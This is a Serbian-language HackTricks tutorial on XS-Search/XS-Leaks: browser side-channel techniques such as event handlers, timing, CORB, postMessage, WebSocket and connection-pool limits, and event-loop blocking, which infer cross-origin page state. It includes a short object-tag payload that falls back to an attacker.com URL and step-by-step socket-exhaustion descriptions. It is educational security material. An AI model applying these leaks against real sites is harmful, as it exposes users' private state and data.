# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

XS-Search je metoda kori코캖ena za **izvla캜enje informacija preko granica porekla** iskori코캖avanjem **ranjivosti bo캜nog kanala**.

Klju캜ni komponenti uklju캜eni u ovaj napad su:

* **Ranjiva Veb stranica**: Ciljna veb stranica sa koje se informacije nameravaju izvu캖i.
* **Veb stranica napada캜a**: Zlonamerna veb stranica koju je napravio napada캜, koju rtva pose캖uje, na kojoj se nalazi eksploatacija.
* **Metod uklju캜ivanja**: Tehnika koja se koristi za uklju캜ivanje Ranjive Veb stranice u Veb stranicu napada캜a (npr. window.open, iframe, fetch, HTML oznaka sa href, itd.).
* **Tehnika curenja**: Tehnike kori코캖ene za razlikovanje razlika u stanju Ranjive Veb stranice na osnovu informacija prikupljenih putem metode uklju캜ivanja.
* **Stanja**: Dva potencijalna stanja Ranjive Veb stranice, koja napada캜 poku코ava razlikovati.
* **Detektovane razlike**: Opservabilne varijacije na koje se napada캜 oslanja da bi zaklju캜io stanje Ranjive Veb stranice.

### Detektovane razlike

Nekoliko aspekata mo쬰 se analizirati kako bi se razlikovala stanja Ranjive Veb stranice:

* **Statusni kod**: Razlikovanje izme캠u **razli캜itih HTTP odgovora statusnih kodova** preko granica porekla, kao 코to su serverske gre코ke, klijentske gre코ke ili autentikacione gre코ke.
* **Kori코캖enje API-ja**: Identifikacija **kori코캖enja Web API-ja** preko stranica, otkrivaju캖i da li stranica preko granica porekla koristi odre캠eni JavaScript Web API.
* **Preusmeravanja**: Detektovanje navigacija ka razli캜itim stranicama, ne samo HTTP preusmeravanja ve캖 i onih pokrenutih JavaScript-om ili HTML-om.
* **Sadr쬬j stranice**: Posmatranje **varijacija u telu HTTP odgovora** ili u pod-resursima stranice, kao 코to su **broj ugra캠enih okvira** ili veli캜inske razlike u slikama.
* **HTTP zaglavlje**: Prime캖ivanje prisustva ili mo쬯a vrednosti **specifi캜nog HTTP odgovora zaglavlja**, uklju캜uju캖i zaglavlja poput X-Frame-Options, Content-Disposition i Cross-Origin-Resource-Policy.
* **Vreme**: Prime캖ivanje konzistentnih vremenskih razlika izme캠u dva stanja.

### Metodi uklju캜ivanja

* **HTML elementi**: HTML nudi razli캜ite elemente za **uklju캜ivanje resursa preko granica porekla**, poput stilova, slika ili skripti, prisiljavaju캖i pregleda캜 da zatra쬴 ne-HTML resurs. Kompilacija potencijalnih HTML elemenata za ovu svrhu mo쬰 se prona캖i na [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Okviri**: Elementi poput **iframe-a**, **object-a** i **embed-a** mogu ugraditi HTML resurse direktno na stranicu napada캜a. Ako stranica **nema za코titu okvira**, JavaScript mo쬰 pristupiti window objektu ugra캠enog resursa putem contentWindow svojstva.
* **Iska캜u캖i prozori**: Metoda **`window.open`** otvara resurs u novom tabu ili prozoru, pru쬬ju캖i **ru캜ku prozora** za JavaScript da interaguje sa metodama i svojstvima prate캖i SOP. Iska캜u캖i prozori, 캜esto kori코캖eni u jednokratnoj prijavi, zaobilaze okvire i restrikcije kola캜i캖a ciljnog resursa. Me캠utim, moderni pregleda캜i ograni캜avaju kreiranje iska캜u캖ih prozora na odre캠ene korisni캜ke akcije.
* **JavaScript zahtevi**: JavaScript dozvoljava direktno zahteve ka ciljnim resursima kori코캖enjem **XMLHttpRequests** ili **Fetch API-ja**. Ove metode nude preciznu kontrolu nad zahtevom, kao 코to je opcija da se prate HTTP preusmeravanja.

### Tehnike curenja

* **Rukovalac doga캠ajima**: Klasika tehnika curenja u XS-Leaks, gde rukovaoci doga캠ajima poput **onload** i **onerror** pru쬬ju uvide o uspehu ili neuspehu u캜itavanja resursa.
* **Poruke o gre코kama**: JavaScript izuzeci ili posebne stranice gre코aka mogu pru쬴ti informacije o curenju ili razlikovanju izme캠u prisustva i odsustva gre코ke.
* **Globalna ograni캜enja**: Fizi캜ka ograni캜enja pregleda캜a, poput kapaciteta memorije ili druga nametnuta ograni캜enja pregleda캜a, mogu signalizirati kada je dostignut prag, slu쬰캖i kao tehnika curenja.
* **Globalno stanje**: Detektovane interakcije sa **globalnim stanjima pregleda캜a** (npr. interfejs Istorije) mogu biti iskori코캖ene. Na primer, **broj unosa** u istoriji pregleda캜a mo쬰 pru쬴ti tragove o stranicama preko granica porekla.
* **Performance API**: Ovaj API pru쬬 **detalje o performansama trenutne stranice**, uklju캜uju캖i mre쬹o vreme za dokument i u캜itane resurse, omogu캖avaju캖i zaklju캜ke o tra쬰nim resursima.
* **캛itljivi atributi**: Neki HTML atributi su **캜itljivi preko granica porekla** i mogu se koristiti kao tehnika curenja. Na primer, svojstvo `window.frame.length` omogu캖ava JavaScript-u da prebroji okvire uklju캜ene na veb stranici preko granica porekla.

## XSinator Alat & Rad

XSinator je automatski alat za **proveru pregleda캜a protiv nekoliko poznatih XS-Leakova** obja코njenih u njegovom radu: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Mo쬰te **pristupiti alatu na** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**Isklju캜eni XS-Leakovi**: Morali smo isklju캜iti XS-Leakove koji se oslanjaju na **servisne radnike** jer bi ometali druge curenja u XSinatoru. Tako캠e, izabrali smo da **isklju캜imo XS-Leakove koji se oslanjaju na lo코e konfiguracije i gre코ke u odre캠enoj veb aplikaciji**. Na primer, lo코e konfiguracije Cross-Origin Resource Sharing (CORS), postMessage curenja ili Cross-Site Scripting. Dodatno, isklju캜ili smo XS-Leakove zasnovane na vremenu jer 캜esto imaju problema sa sporim, bu캜nim i neta캜nim rezultatima.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
## **Tehnike zasnovane na vremenu**

Neke od slede캖ih tehnika koristi캖e vreme kao deo procesa za otkrivanje razlika u mogu캖im stanjima veb stranica. Postoje razli캜iti na캜ini merenja vremena u veb pregleda캜u.

**Satovi**: API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) omogu캖ava programerima da dobiju merenja visoke rezolucije vremena.\
Postoji zna캜ajan broj API-ja koje napada캜i mogu zloupotrebiti kako bi kreirali implicitne satove: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animacije i drugi.\
Za vi코e informacija: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Tehnike rukovaoca doga캠ajima

### Onload/Onerror

* **Metodi uklju캜ivanja**: Okviri, HTML elementi
* **Detektovana razlika**: Statusni kod
* **Vi코e informacija**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Rezime**: ako se poku코a u캜itavanje resursa i doga캠aji onerror/onload se aktiviraju kada se resurs uspe코no/neuspe코no u캜ita, mogu캖e je saznati statusni kod.
* **Primer koda**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Primer koda poku코ava da **u캜ita objekte skriptova iz JS-a**, ali se **drugi tagovi** poput objekata, stilova, slika, zvukova tako캠e mogu koristiti. Tako캠e, mogu캖e je direktno ubaciti **tag** i deklarisati doga캠aje `onload` i `onerror` unutar taga (umesto da se ubacuje iz JS-a).

Postoji i verzija ovog napada bez skripti:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
U ovom slu캜aju, ako se `example.com/404` ne prona캠e, u캜ita캖e se `attacker.com/?error`.

### Vreme u캜itavanja

* **Metode uklju캜ivanja**: HTML elementi
* **Detektoviva razlika**: Vreme (obi캜no zbog sadr쬬ja stranice, statusnog koda)
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Rezime:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** se mo쬰 koristiti za merenje vremena potrebnog za izvr코avanje zahteva. Me캠utim, mogu se koristiti i drugi 캜asovnici, poput [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) koji mo쬰 identifikovati zadatke koji se izvr코avaju du쬰 od 50ms.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) jo코 jedan primer u:

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Vreme u캜itavanja + Prisilni te쬬k zadatak

Ova tehnika je sli캜na prethodnoj, ali 캖e **napada캜** tako캠e **prisiliti** neku akciju da traje **relevantno dugo vreme** kada je **odgovor pozitivan ili negativan** i meriti to vreme.

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Vreme istovarivanja/pre istovarivanja

* **Metode uklju캜ivanja**: Frejmovi
* **Detektoviva razlika**: Vreme (obi캜no zbog sadr쬬ja stranice, statusnog koda)
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Rezime:** [SharedArrayBuffer 캜asovnik](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) se mo쬰 koristiti za merenje vremena potrebnog za izvr코avanje zahteva. Mogu se koristiti i drugi 캜asovnici.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Vreme potrebno za preuzimanje resursa mo쬰 se meriti kori코캖enjem doga캠aja [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) i [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event). Doga캠aj **`beforeunload`** se pokre캖e kada se pregleda캜 sprema da pre캠e na novu stranicu, dok se doga캠aj **`unload`** de코ava kada se navigacija zapravo odvija. Razlika u vremenu izme캠u ova dva doga캠aja mo쬰 se izra캜unati kako bi se odredilo **koliko je vremena pregleda캜 proveo preuzimaju캖i resurs**.

### Vreme frejma sa peskom + u캜itavanje <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Metode uklju캜ivanja**: Frejmovi
* **Detektoviva razlika**: Vreme (obi캜no zbog sadr쬬ja stranice, statusnog koda)
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Rezime:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API se mo쬰 koristiti za merenje vremena potrebnog za izvr코avanje zahteva. Mogu se koristiti i drugi 캜asovnici.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Prime캖eno je da u odsustvu [Za코titnih okvira](https://xsleaks.dev/docs/defenses/opt-in/xfo/), vreme potrebno za u캜itavanje stranice i njenih podresursa preko mre쬰 mo쬰 biti izmereno od strane napada캜a. Ovo merenje je obi캜no mogu캖e jer se `onload` rukovalac iframe-a pokre캖e tek nakon zavr코etka u캜itavanja resursa i izvr코avanja JavaScript-a. Da bi zaobi코li varijabilnost uvedenu izvr코avanjem skripti, napada캜 mo쬰 koristiti atribut [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) unutar `<iframe>`. Uklju캜ivanje ovog atributa ograni캜ava brojne funkcionalnosti, posebno izvr코avanje JavaScript-a, 캜ime se olak코ava merenje koje je prete쬹o uticano performansama mre쬰.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + gre코ka + onload

* **Metode uklju캜ivanja**: Okviri
* **Detektovana razlika**: Sadr쬬j stranice
* **Vi코e informacija**:
* **Sa쬰tak**: Ako mo쬰te da izazovete gre코ku na stranici kada se pristupi ispravnom sadr쬬ju i da je pravilno u캜itate kada se pristupi bilo kom sadr쬬ju, tada mo쬰te napraviti petlju za izvla캜enje svih informacija bez merenja vremena.
* **Primer koda**:

Pretpostavimo da mo쬰te **ubaciti** **stranicu** koja ima **tajni** sadr쬬j **unutar Iframe-a**.

Mo쬰te **naterati rtvu da tra쬴** datoteku koja sadr쬴 "_**flag**_" koriste캖i **Iframe** (iskori코캖avaju캖i CSRF na primer). Unutar Iframe-a znate da 캖e se _**onload doga캠aj**_ uvek **izvr코iti barem jednom**. Zatim, mo쬰te **promeniti** **URL** Iframe-a menjaju캖i samo **sadr쬬j** **hash-a** unutar URL-a.

Na primer:

1. **URL1**: www.napadac.com/xssearch#probaj1
2. **URL2**: www.napadac.com/xssearch#probaj2

Ako je prvi URL **uspe코no u캜itan**, tada, kada se **promeni** **hash** deo URL-a, **onload** doga캠aj **ne캖e biti ponovo pokrenut**. Ali **ako** je stranica imala neku vrstu **gre코ke** prilikom **u캜itavanja**, tada 캖e se **onload** doga캠aj **ponovo pokrenuti**.

Tako mo쬰te **razlikovati izme캠u** stranice koja je **ispravno** u캜itana ili stranice koja ima **gre코ku** prilikom pristupa.

### Izvr코enje Javascript-a

* **Metode uklju캜ivanja**: Okviri
* **Detektovana razlika**: Sadr쬬j stranice
* **Vi코e informacija**:
* **Sa쬰tak**: Ako **stranica** vra캖a **osetljiv** sadr쬬j, **ili** sadr쬬j koji mo쬰 biti **kontrolisan** od strane korisnika. Korisnik mo쬰 postaviti **validan JS kod u negativnom slu캜aju**, i **u캜itati** svaki poku코aj unutar **`<script>`** oznaka, tako da u **negativnim** slu캜ajevima napada캜ev **kod** se **izvr코ava**, a u **afirmativnim** slu캜ajevima **ni코ta** se ne캖e izvr코iti.
* **Primer koda**:

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Metode uklju캜ivanja**: HTML elementi
* **Detektovana razlika**: Statusni kod i zaglavlja
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Sa쬰tak**: **Cross-Origin Read Blocking (CORB)** je sigurnosna mera koja spre캜ava u캜itavanje odre캠enih osetljivih resursa sa razli캜itih izvora kako bi se za코titili od napada poput **Spectre**. Me캠utim, napada캜i mogu iskoristiti njegovo za코titno pona코anje. Kada odgovor podlo쬬n **CORB**-u vrati _**CORB za코ti캖eni**_ `Content-Type` sa `nosniff` i statusni kod `2xx`, **CORB** uklanja telo i zaglavlja odgovora. Napada캜i koji to posmatraju mogu zaklju캜iti kombinaciju **statusnog koda** (ukazuju캖i na uspeh ili gre코ku) i `Content-Type` (ozna캜avaju캖i da li je za코ti캖en od strane **CORB**-a), 코to mo쬰 dovesti do potencijalnog otkrivanja informacija.
* **Primer koda**:

Proverite link za vi코e informacija o napadu.

### onblur

* **Metode uklju캜ivanja**: Okviri
* **Detektovana razlika**: Sadr쬬j stranice
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Sa쬰tak**: Procure osetljivi podaci iz id ili name atributa.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Mogu캖e je **u캜itati stranicu** unutar **iframe-a** i koristiti **`#id_vrednost`** da bi se stranica **fokusirala na element** iframe-a sa nazna캜enim id-om, zatim ako je **`onblur`** signal pokrenut, ID element postoji.\
Mo쬰te izvesti isti napad sa **`portal`** oznakama.

### postMessage Emitovanja <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Metode uklju캜ivanja**: Okviri, Iska캜u캖i prozori
* **Detektovana razlika**: Kori코캖enje API-ja
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Sa쬰tak**: Prikupljanje osetljivih informacija putem postMessage ili kori코캖enje prisustva postMessages kao orakla da bi se znalo stanje korisnika na stranici
* **Primer koda**: `Bilo koji kod koji oslu코kuje sve postMessages.`

Aplikacije 캜esto koriste [`postMessage` emitovanja](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) za komunikaciju izme캠u razli캜itih izvora. Me캠utim, ovaj metod mo쬰 nenamerno otkriti **osetljive informacije** ako parametar `targetOrigin` nije pravilno specificiran, omogu캖avaju캖i bilo kojem prozoru da primi poruke. Osim toga, samo primanje poruke mo쬰 delovati kao **orakl**; na primer, odre캠ene poruke mogu biti poslate samo korisnicima koji su prijavljeni. Stoga, prisustvo ili odsustvo ovih poruka mo쬰 otkriti informacije o stanju ili identitetu korisnika, kao 코to je da li su autentifikovani ili ne.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pomo캖u najnaprednijih alata zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Globalne Tehnike Ograni캜enja

### WebSocket API

* **Metode uklju캜ivanja**: Okviri, Iska캜u캖i prozori
* **Detektovana razlika**: Kori코캖enje API-ja
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Sa쬰tak**: Iscrpljivanje limita WebSocket veze otkriva broj WebSocket veza stranice sa razli캜itog porekla.
* **Primer koda**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Mogu캖e je identifikovati da li, i koliko, **WebSocket veza ciljna stranica koristi**. To omogu캖ava napada캜u da otkrije stanja aplikacije i procure informacije vezane za broj WebSocket veza.

Ako jedan **izvor** koristi **maksimalan broj WebSocket** objekata veze, bez obzira na njihovo stanje veze, kreiranje **novih objekata rezultira캖e JavaScript izuzecima**. Da bi izveo ovaj napad, napada캜ki veb sajt otvara ciljni veb sajt u iska캜u캖em prozoru ili iframe-u, a zatim, nakon 코to je ciljni veb u캜itan, poku코ava da kreira maksimalan broj mogu캖ih WebSocket veza. **Broj ba캜enih izuzetaka** je **broj WebSocket veza koje koristi ciljni veb sajt** prozor.
### Payment API

* **Metode uklju캜ivanja**: Okviri, Iska캜u캖i prozori
* **Detektibilna razlika**: Kori코캖enje API-ja
* **Vi코e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Sa쬰tak**: Otkrijte zahtev za pla캖anje jer samo jedan mo쬰 biti aktivan u isto vreme.
* **Primer koda**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Ovaj XS-Leak omogu캖ava napada캜u da **otkrije kada prekograni캜na stranica pokrene zahtev za pla캖anje**.

Zato 코to **samo jedan zahtev za pla캖anje mo쬰 biti aktivan** u isto vreme, ako ciljana veb lokacija koristi Payment Request API, bilo kakvi **dalji poku코aji kori코캖enja ovog API-ja 캖e propasti**, i izazvati **JavaScript izuzetak**. Napada캜 mo쬰 iskoristiti ovo tako 코to 캖e **periodi캜no poku코avati da prika쬰 Payment API UI**. Ako jedan poku코aj izazove izuzetak, ciljana veb lokacija trenutno ga koristi. Napada캜 mo쬰 sakriti ove periodi캜ne poku코aje tako 코to 캖e odmah zatvoriti UI nakon kreiranja.

### Merenje Event Loop-a <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Metode uklju캜ivanja**:
* **Detektibilna razlika**: Vreme (uglavnom zbog Sadr쬬ja Stranice, Statusnog Koda)
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Sa쬰tak**: Merenje vremena izvr코avanja veba zloupotrebom jednonitnog JS event loop-a.
* **Primer koda**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript funkcioni코e na [jednonitnom event loop-u](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) modelu konkurentnosti, 코to zna캜i da **mo쬰 izvr코avati samo jedan zadatak u isto vreme**. Ova karakteristika mo쬰 biti iskori코캖ena da se utvrdi **koliko vremena je potrebno da se kod sa razli캜itog porekla izvr코i**. Napada캜 mo쬰 meriti vreme izvr코avanja svog koda u event loop-u kontinuiranim slanjem doga캠aja sa fiksnim svojstvima. Ti doga캠aji 캖e biti obra캠eni kada je event pool prazan. Ako i druga porekla tako캠e 코alju doga캠aje u isti pool, **napada캜 mo쬰 zaklju캜iti koliko vremena je potrebno da se ti spoljni doga캠aji izvr코e posmatraju캖i ka코njenja u izvr코avanju svojih zadataka**. Ovaj metod pra캖enja event loop-a za ka코njenja mo쬰 otkriti vreme izvr코avanja koda sa razli캜itih porekla, potencijalno otkrivaju캖i osetljive informacije.

{% hint style="warning" %}
Prilikom merenja vremena izvr코avanja mogu캖e je **eliminisati** **mre쬹e faktore** kako bi se dobile **preciznije merenja**. Na primer, u캜itavanjem resursa kori코캖enih od strane stranice pre njenog u캜itavanja.
{% endhint %}

### Zauzet Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Metode uklju캜ivanja**:
* **Detektibilna razlika**: Vreme (uglavnom zbog Sadr쬬ja Stranice, Statusnog Koda)
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Sa쬰tak**: Jedan metod za merenje vremena izvr코avanja veb operacije uklju캜uje namerno blokiranje event loop-a niti, a zatim merenje **koliko vremena je potrebno da event loop postane ponovo dostupan**. Ubacivanjem blokiraju캖e operacije (kao 코to je dugotrajno ra캜unanje ili sinhroni API poziv) u event loop, i pra캖enjem vremena koje je potrebno da slede캖i kod po캜ne sa izvr코avanjem, mo쬰 se zaklju캜iti trajanje zadataka koji su se izvr코avali u event loop-u tokom blokiranog perioda. Ova tehnika koristi jednonitnu prirodu JavaScript-ovog event loop-a, gde se zadaci izvr코avaju sekvencijalno, i mo쬰 pru쬴ti uvid u performanse ili pona코anje drugih operacija koje dele istu nit.
* **Primer koda**:

Zna캜ajna prednost tehnike merenja vremena izvr코avanja blokiranjem event loop-a je njena sposobnost da zaobi캠e **Izolaciju Sajta**. **Izolacija Sajta** je bezbednosna funkcija koja razdvaja razli캜ite veb lokacije u odvojene procese, sa ciljem da spre캜i zlonamerne sajtove da direktno pristupe osetljivim podacima sa drugih sajtova. Me캠utim, uticajem na vreme izvr코avanja druge lokacije kroz deljeni event loop, napada캜 mo쬰 indirektno izvu캖i informacije o aktivnostima te lokacije. Ovaj metod ne oslanja se na direktni pristup podacima druge lokacije, ve캖 posmatra uticaj aktivnosti te lokacije na deljeni event loop, 캜ime izbegava za코titne barijere uspostavljene od strane **Izolacije Sajta**.

{% hint style="warning" %}
Prilikom merenja vremena izvr코avanja mogu캖e je **eliminisati** **mre쬹e faktore** kako bi se dobile **preciznije merenja**. Na primer, u캜itavanjem resursa kori코캖enih od strane stranice pre njenog u캜itavanja.
{% endhint %}

### Pool konekcija

* **Metode uklju캜ivanja**: JavaScript Zahtevi
* **Detektibilna razlika**: Vreme (uglavnom zbog Sadr쬬ja Stranice, Statusnog Koda)
* **Vi코e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Sa쬰tak**: Napada캜 mo쬰 blokirati sve sokete osim 1, u캜itati ciljnu veb stranicu i istovremeno u캜itati drugu stranicu, vreme dok se poslednja stranica po캜ne u캜itavati je vreme koje je ciljna stranica uzela za u캜itavanje.
* **Primer koda**:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

Pregleda캜i koriste sokete za komunikaciju sa serverom, ali zbog ograni캜enih resursa operativnog sistema i hardvera, **pregleda캜i su primorani da nametnu ograni캜enje** na broj istovremenih soketa. Napada캜i mogu iskoristiti ovo ograni캜enje kroz slede캖e korake:

1. Utvrditi ograni캜enje soketa pregleda캜a, na primer, 256 globalnih soketa.
2. Zauzeti 255 soketa tokom produ쬰nog perioda pokretanjem 255 zahteva ka razli캜itim hostovima, dizajniranih da odr쬰 otvorene veze bez zavr코etka.
3. Koristiti 256. soket za slanje zahteva ka ciljnoj stranici.
4. Poku코ati 257. zahtev ka drugom hostu. S obzirom da su svi soketi zauzeti (kao u koracima 2 i 3), ovaj zahtev 캖e biti stavljen u red 캜ekanja dok soket ne postane dostupan. Ka코njenje pre nego 코to ovaj zahtev nastavi pru쬬 napada캜u informacije o vremenskim aktivnostima mre쬰 povezanim sa 256. soketom (soketom ciljne stranice). Ova zaklju캜ivanja su mogu캖a jer su 255 soketa iz koraka 2 i dalje zauzeta, 코to implicira da svaki novo dostupan soket mora biti onaj oslobo캠en iz koraka 3. Vreme potrebno da 256. soket postane dostupan direktno je povezano sa vremenom potrebnim za zavr코etak zahteva ka ciljnoj stranici.

Za vi코e informacija: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/) 

### Pool konekcija po Destinaciji

* **Metode uklju캜ivanja**: JavaScript Zahtevi
* **Detektibilna razlika**: Vreme (uglavnom zbog Sadr쬬ja Stranice, Statusnog Koda)
* **Vi코e informacija**:
* **Sa쬰tak**: Sli캜no kao prethodna tehnika, ali umesto kori코캖enja svih soketa, Google **Chrome** postavlja ograni캜enje od **6 istovremenih zahteva ka istom poreklu**. Ako **blokiramo 5** a zatim **pokrenemo 6.** zahtev mo쬰mo ga **meriti** i ako uspemo da nateramo **rtvenu stranicu da po코alje** vi코e **zahteva** ka istom endpointu kako bismo otkrili **status** stranice, **6. zahtev** 캖e trajati **du쬰** i mo쬰mo to otkriti.
## Tehnike API performansi

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) pru쬬 uvide u metrike performansi veb aplikacija, dodatno oboga캖ene [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API). Resource Timing API omogu캖ava pra캖enje detaljnih vremena mre쬹ih zahteva, kao 코to su trajanje zahteva. Posebno, kada serveri uklju캜e zaglavlje `Timing-Allow-Origin: *` u svojim odgovorima, dodatni podaci poput veli캜ine prenosa i vremena pretrage domena postaju dostupni.

